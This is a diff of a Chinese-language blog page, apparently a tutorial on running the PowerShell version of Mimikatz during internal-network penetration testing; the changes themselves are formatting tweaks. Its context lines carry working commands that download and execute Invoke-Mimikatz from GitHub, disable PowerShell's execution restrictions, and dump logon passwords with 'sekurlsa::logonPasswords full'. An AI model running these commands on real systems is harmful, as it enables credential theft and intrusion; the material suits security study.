@@ -238,7 +238,7 @@
         </center>
     </div>
     <div class="content-article">
-        <h3 id="Powershell版Mimikatz脚本使用"><a href="#Powershell版Mimikatz脚本使用" class="headerlink" title="Powershell版Mimikatz脚本使用"></a>Powershell版Mimikatz脚本使用</h3><p>********Invoke-Mimikatz.ps1脚本地址:*********<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1">https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1</a></p>
+        <h3 id="Powershell版Mimikatz脚本使用"><a href="#Powershell版Mimikatz脚本使用" class="headerlink" title="Powershell版Mimikatz脚本使用"></a>Powershell版Mimikatz脚本使用</h3><p>**Invoke-Mimikatz.ps1脚本地址:**<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1">https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1</a></p>
 <p><strong>有网络环境下执行命令</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;脚本地址&#x27;); Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure>
 
@@ -249,9 +249,15 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object</span><br><span class="line">System.Net.Webclient).DownloadFile(&#x27;ps1脚本地址&#x27;;&#x27;C:\Users\Administrator\Desktop\Invoke-Mimikatz.ps1&#x27;)</span><br></pre></td></tr></table></figure>
 
 <p><strong>本地导入脚本执行</strong></p>
+<blockquote>
 <p>查看脚本执行限制     Get-ExecutionPolicy</p>
+</blockquote>
+<blockquote>
 <p>设置为允许任意脚本执行     Set-ExecutionPolicy Unrestricted</p>
+</blockquote>
+<blockquote>
 <p>导入命令    Import-Module .\Invoke-Mimikatz.ps1</p>
+</blockquote>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command &#x27;&quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot;&#x27;</span><br></pre></td></tr></table></figure>
 
 <p><strong>本地绕过权限执行</strong></p>
@@ -399,9 +405,9 @@
                 
                 <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
     
-    <a href="/tags/powershell/" style="font-size: 17.030839608316057px;" class="tag-cloud-link">powershell</a>
+    <a href="/tags/powershell/" style="font-size: 14.738915453660145px;" class="tag-cloud-link">powershell</a>
     
-    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 16.256802141785304px;" class="tag-cloud-link">内网渗透</a>
+    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 11.887729437977553px;" class="tag-cloud-link">内网渗透</a>
     
 </div>
                 
